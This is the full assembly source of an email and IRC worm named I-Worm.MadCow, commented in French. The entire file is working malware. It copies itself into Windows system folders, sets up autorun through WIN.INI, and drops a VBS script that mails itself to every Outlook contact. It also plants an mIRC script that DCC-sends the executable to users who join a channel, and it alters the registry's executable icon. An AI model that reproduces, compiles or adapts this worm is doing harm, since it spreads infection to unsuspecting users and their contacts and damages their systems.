comment *               ///// I-Worm.MadCow par PetiK /////       25/11/2000

Pour assembler :        tasm32 /M /ML madcow.asm
                        tlink32 -Tpe -aa -x madcow.obj,,,import32.lib *

jumps
locals
.386
.model flat,stdcall

;KERNEL32.dll
extrn lstrcat:PROC
extrn WritePrivateProfileStringA:PROC
extrn CloseHandle:PROC
extrn CopyFileA:PROC
extrn CreateDirectoryA:PROC
extrn CreateFileA:PROC
extrn DeleteFileA:PROC
extrn ExitProcess:PROC
extrn GetModuleFileNameA:PROC
extrn GetModuleHandleA:PROC
extrn GetSystemDirectoryA:PROC
extrn GetWindowsDirectoryA:PROC
extrn MoveFileA:PROC
extrn WinExec:PROC
extrn WriteFile:PROC

;ADVAPI32.dll
extrn RegSetValueExA:PROC
extrn RegCreateKeyExA:PROC
extrn RegCloseKey:PROC

.data
regDisp dd 0
regResu dd 0
l       dd 0
p       dd 0
fh      dd 0
octets  dd ?
szOrig  db 260 dup (0)
szOrig2 db 260 dup (0)
szCopie db 260 dup (0)
szCopi2 db 260 dup (0)
szCico  db 260 dup (0)
szWin   db 260 dup (0)
Dossier db "C:\Win32",00h
fichier db "C:\Win32\Salut.ico",00h
Copico  db "\MSLS.ICO",00h
Copie   db "\Wininet32.exe",00h
Copie2  db "\MadCow.exe",00h
BATFILE db "C:\Win32\ENVOIE.BAT",00h
VBSFILE db "C:\Win32\ENVOIE.VBS",00h
Winini  db "\\WIN.INI",00h
run     db "run",00h
windows db "windows",00h
fileini db "C:\Win32\script.ini",00h
Copie3  db "C:\Win32\MadCow.exe",00h
script1 db "C:\mirc\script.ini",00h
script2 db "C:\mirc32\script.ini",00h
script3 db "C:\program files\mirc\script.ini",00h
script4 db "C:\program files\mirc32\script.ini",00h
CLE     db "Software\[Atchoum]",00h
CLE2    db "\exefile\DefaultIcon",00h
Signature       db "IWorm.MadCow par PetiK (c)2000"

vbsd:
db 'DEBUT()',0dh,0ah
db 'Sub DEBUT()',0dh,0ah
db 'EMAIL()',0dh,0ah
db 'End Sub',0dh,0ah
db '',0dh,0ah
db 'Sub EMAIL()',0dh,0ah
db 'Set K = CreateObject("Outlook.Application")',0dh,0ah
db 'Set L = K.GetNameSpace("MAPI")',0dh,0ah
db 'For Each M In L.AddressLists',0dh,0ah
db 'If M.AddressEntries.Count <> 0 Then',0dh,0ah
db 'Set N = K.CreateItem(0)',0dh,0ah
db 'For O = 1 To M.AddressEntries.Count',0dh,0ah
db 'Set P = M.AddressEntries(O)',0dh,0ah
db 'If O = 1 Then',0dh,0ah
db 'N.BCC = P.Address',0dh,0ah
db 'Else',0dh,0ah
db 'N.BCC = N.BCC & "; " & P.Address',0dh,0ah
db 'End If',0dh,0ah
db 'Next',0dh,0ah
db 'N.Subject = "Pourquoi les vaches sont-elles folles ?"',0dh,0ah
db 'N.Body = "Voila un rapport expliquant la folie des vaches"',0dh,0ah
db 'Set Q = CreateObject("Scripting.FileSystemObject")',0dh,0ah
db 'N.Attachments.Add Q.BuildPath(Q.GetSpecialFolder(0),"MadCow.exe")',0dh,0ah
db 'N.Send',0dh,0ah
db 'End If',0dh,0ah
db 'Next',0dh,0ah
db 'End Sub',0dh,0ah
vbstaille equ $-vbsd

batd:
db '@echo off',0dh,0ah
db 'start C:\Win32\ENVOIE.VBS',0dh,0ah
battaille equ $-batd

inid:
db "[script]",0dh,0ah
db "n0=on 1:JOIN:#:{",0dh,0ah
db "n1= /if ( $nick == $me ) { halt }",0dh,0ah
db "n2= /.dcc send $nick C:\Win32\MadCow.exe",0dh,0ah
db "n3=}",00h
initaille equ $-inid

include icone.inc

.code
DEBUT:
VERIF:  mov  eax,offset CLE             ; V‚rifie si il existe une cl‚
        call REG                        ; [Atchoum] dans HKLM\Software.
        cmp  [regDisp],1                ; Si elle n'y est pas, 
        jne  INIFILE                     ; on installe les composants

COPIE:  push 0                          ; 
        call GetModuleHandleA           ;
        push 260                        ; 
        push offset szOrig              ;
        push eax                        ;
        call GetModuleFileNameA         ; Copie le fichier original
        push 260                        ;
        push offset szCopie             ;
        call GetSystemDirectoryA        ; dans le dossier SYSTEM
        push offset Copie               ;
        push offset szCopie             ;
        call lstrcat                    ; sous le nom de Wininet32.exe
        push 00h                        ;
        push offset szCopie             ;
        push offset szOrig              ;
        call CopyFileA                  ;
        push 260                        ; puis
        push offset szCopi2             ;
        call GetWindowsDirectoryA       ; … nouveau dans le dossier WINDOWS
        push offset Copie2              ;
        push offset szCopi2             ;
        call lstrcat                    ; sous le nom de MadCow.exe
        push 00h                        ;
        push offset szCopi2             ;
        push offset szOrig              ;
        call CopyFileA                  ;

WIN_INI:push 260                        ; Pour lancer le programme, on peut
        push offset szWin               ;
        call GetWindowsDirectoryA       ; utiliser la base de registre ou le 
        push offset Winini              ;
        push offset szWin               ; fichier WIN.INI dans le dossier
        call lstrcat                    ;
        push offset szWin               ; WINDOWS. La d‚marche est simple :
        push offset szCopie             ; [windows]
        push offset run                 ; run="nom du programme"
        push offset windows             ;
        call WritePrivateProfileStringA ;

DIR:    push 00h                        ; On cr‚e ici C:\Win32
        push offset Dossier             ;
        call CreateDirectoryA           ;
EMAIL  :push 00000000h                  ; On va cr‚er C:\Win32\ENVOIE.VBS
        push 00000080h                  ;
        push 00000002h                  ; 
        push 00000000h                  ;
        push 00000001h                  ;
        push 40000000h                  ;
        push offset VBSFILE             ;
        call CreateFileA                ;
        mov  [fh],eax                   ;
        push 00h                        ;
        push offset octets              ;
        push vbstaille                  ;
        push offset vbsd                ;
        push [fh]                       ;
        call WriteFile                  ;
        push [fh]                       ;
        call CloseHandle                ;
EXEC   :push 00000000h                  ; et C:\Win32\ENVOIE.BAT
        push 00000080h                  ;
        push 00000002h                  ; qui va ‚x‚cuter ENVOIE.VBS
        push 00000000h                  ;
        push 00000001h                  ;
        push 40000000h                  ;
        push offset BATFILE             ;
        call CreateFileA                ;
        mov  [fh],eax                   ;
        push 00h                        ;
        push offset octets              ;
        push battaille                  ;
        push offset batd                ;
        push [fh]                       ;
        call WriteFile                  ;
        push [fh]                       ;
        call CloseHandle                ;
        jmp  EXECBAT                    ;

REG:    push offset regDisp             ;
        push offset regResu             ;
        push 0                          ;
        push 0F003Fh                    ;
        push 0                          ;
        push 0                          ;
        push 0                          ;
        push eax                        ; Software\[Atchoum]
        push 80000002h                  ; HKEY_LOCAL_MACHINE
        call RegCreateKeyExA            ;
        push [regResu]                  ; met la valeur dans regResu
        call RegCloseKey                ;
        ret                             ;

INIFILE:push 00000000h                  ; On va cr‚er dans C:\Win32
        push 00000001h                  ;
        push 00000002h                  ; le fichier script.ini
        push 00000000h                  ;
        push 00000001h                  ; en lecture seul.
        push 40000000h                  ;
        push offset fileini             ;
        call CreateFileA                ;
        mov  [fh],eax                   ;
        push 00h                        ;
        push offset octets              ;
        push initaille                  ;
        push offset inid                ;
        push [fh]                       ;
        call WriteFile                  ;
        push [fh]                       ;
        call CloseHandle                ;

        push 00h                        ; On va copier ce fichier dans les
        push offset script1             ; r‚pertoire suivant :
        push offset fileini             ; 
        call CopyFileA                  ; C:\mirc C:\mirc32
        test eax,eax                    ; C:\program files\mirc et dans
        jnz  COPYWIN                    ; C:\program files\mirc32
        push 00h                        ;
        push offset script2             ; Si il arrive … se copier dans un
        push offset fileini             ; de ces fichier, il va cr‚er une
        call CopyFileA                  ; copie du programme dans C:\Win32
        test eax,eax                    ; le nom MadCow.exe
        jnz  COPYWIN                    ;
        push 00h                        ;
        push offset script3             ;
        push offset fileini             ;
        call CopyFileA                  ;
        test eax,eax                    ;
        jnz  COPYWIN                    ;
        push 00h                        ;
        push offset script4             ;
        push offset fileini             ;
        call CopyFileA                  ;
        test eax,eax                    ;
        jz   ICOFILE                    ;

COPYWIN:push 0                          ; 
        call GetModuleHandleA           ;
        push 260                        ; 
        push offset szOrig2             ;
        push eax                        ;
        call GetModuleFileNameA         ; Copie le fichier original
        push 00h                        ;
        push offset Copie3              ;
        push offset szOrig2             ;
        call CopyFileA                  ;
        jmp  FIN                        ;

ICOFILE:push 00000000h                  ; On va cr‚er … la base du disque
        push 00000080h                  ;
        push 00000002h                  ; dur le fichier Salut.ico
        push 00000000h                  ;
        push 00000001h                  ;
        push 40000000h                  ;
        push offset fichier             ;
        call CreateFileA                ;
        mov  [fh],eax                   ;
        push 00h                        ;
        push offset octets              ;
        push icotaille                  ;
        push offset icod                ;
        push [fh]                       ;
        call WriteFile                  ;
        push [fh]                       ;
        call CloseHandle                ;
        push 260                        ; On d‚place le fichier Salut.ico
        push offset szCico              ; 
        call GetSystemDirectoryA        ; dans le dossier SYSTEM sous
        push offset Copico              ; 
        push offset szCico              ; MSLS.ICO
        call lstrcat                    ; 
        push offset szCico              ;
        push offset fichier             ;
        call MoveFileA                  ; => c'est fait

REG2:   push offset l                   ;
        push offset p                   ;
        push 0                          ;
        push 1F0000h + 1 + 2h           ;
        push 0                          ;
        push 0                          ;
        push 0                          ;
        push offset CLE2                ; Run   
        push 80000000h                  ; HKEY_CLASSES_ROOT
        call RegCreateKeyExA            ;
        push 05h                        ;
        push offset szCico              ; %system%\MSLS.ico
        push 01h                        ;
        push 0                          ;
        push 00h                        ; VALEUR PAR DEFAUT                 
        push p                          ;
        call RegSetValueExA             ; CREE UN REGISTRE
        push 0                          ;
        call RegCloseKey                ; FERME LA BASE DE REGISTRE
        jmp  FIN                        ; PUIS TERMINE LE PROGRAMME

EXECBAT:push 01h                        ; On ‚x‚cute le fichier ENVOIE.BAT
        push offset BATFILE             ;
	call WinExec			;
FIN:    push 00h                        ; FIN DU PROGRAMME
        call ExitProcess                ;

end DEBUT

*************************************************************************

comment *

ICONE.INC pour I-Worm.MadCow
CE FICHIER EST LA FORME HEXADECIMAL DE L'ICONE QUE L'ON VEUT CREER
*

icod:
db 000h,000h,001h,000h,001h,000h,010h,010h,010h,000h,000h,000h,000h,000h
db 028h,001h,000h,000h,016h,000h,000h,000h,028h,000h,000h,000h,010h,000h
db 000h,000h,020h,000h,000h,000h,001h,000h,004h,000h,000h,000h,000h,000h
db 0C0h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,010h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,080h,000h
db 000h,080h,000h,000h,000h,080h,080h,000h,080h,000h,000h,000h,080h,000h
db 080h,000h,080h,080h,000h,000h,0C0h,0C0h,0C0h,000h,080h,080h,080h,000h
db 000h,000h,0FFh,000h,000h,0FFh,000h,000h,000h,0FFh,0FFh,000h,0FFh,000h
db 000h,000h,0FFh,000h,0FFh,000h,0FFh,0FFh,000h,000h,0FFh,0FFh,0FFh,000h
db 0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh,0F0h,000h,000h,000h,000h,000h
db 000h,00Fh,0F0h,000h,000h,000h,000h,000h,000h,00Fh,0F0h,000h,000h,00Fh
db 0FFh,000h,000h,00Fh,0F0h,000h,000h,0F0h,000h,0F0h,000h,00Fh,0F0h,000h
db 000h,0F0h,000h,0F0h,000h,00Fh,0F0h,000h,00Fh,000h,000h,00Fh,000h,00Fh
db 0F0h,000h,00Fh,000h,00Fh,00Fh,000h,00Fh,0F0h,000h,0F0h,0FFh,000h,0F0h
db 0F0h,00Fh,0F0h,000h,0F0h,000h,000h,000h,0F0h,00Fh,0F0h,000h,00Fh,000h
db 000h,00Fh,000h,00Fh,0F0h,000h,00Fh,0FFh,0FFh,0FFh,000h,00Fh,0F0h,000h
db 0F0h,000h,000h,000h,0F0h,00Fh,0F0h,000h,00Fh,000h,000h,00Fh,000h,00Fh
db 0F0h,000h,000h,000h,000h,000h,000h,00Fh,0FFh,0FFh,0FFh,0FFh,0FFh,0FFh
db 0FFh,0FFh,000h,000h,0FFh,0FFh,07Fh,0FEh,0FFh,0FFh,07Fh,0FEh,0FFh,0FFh
db 07Eh,03Eh,0FFh,0FFh,07Dh,0DEh,0FFh,0FFh,07Dh,0DEh,0FFh,0FFh,07Bh,0EEh
db 0FFh,0FFh,07Bh,0AEh,0FFh,0FFh,074h,0D6h,0FFh,0FFh,077h,0F6h,0FFh,0FFh
db 07Bh,0EEh,0FFh,0FFh,078h,00Eh,0FFh,0FFh,077h,0F6h,0FFh,0FFh,07Bh,0EEh
db 0FFh,0FFh,07Fh,0FEh,0FFh,0FFh,000h,000h,0FFh,0FFh                    
icotaille equ $-icod
